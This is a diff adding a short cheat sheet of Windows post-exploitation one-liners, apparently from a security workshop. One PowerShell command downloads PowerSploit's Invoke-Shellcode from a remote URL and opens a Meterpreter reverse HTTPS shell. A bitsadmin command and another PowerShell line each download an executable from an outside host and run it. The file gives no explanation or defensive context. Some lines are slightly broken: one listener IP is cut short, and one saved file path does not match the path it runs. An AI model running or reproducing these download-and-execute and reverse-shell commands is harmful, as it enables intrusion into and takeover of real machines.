@@ -1,0 +1,8 @@
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/PowerSploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.137. -Lport 4433 -Force"
+
+cmd.exe /c "bitsadmin /transfer myhob /download /priority high http://192.168.230.137/payload.exe c:\Users\WorkShop\payload.exe&start c:\Users\workshop\Desktop\payload.exe"
+
+
+Windows 7 Post-Exploitation: Download and Execute Tricks Option 3: PowerShell:
+==============================================================================
+cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.grethathacker.net/tools/messbox.exe','mess.exe');(New-Object -com Shell.Application).ShellExecute('mess.exe');
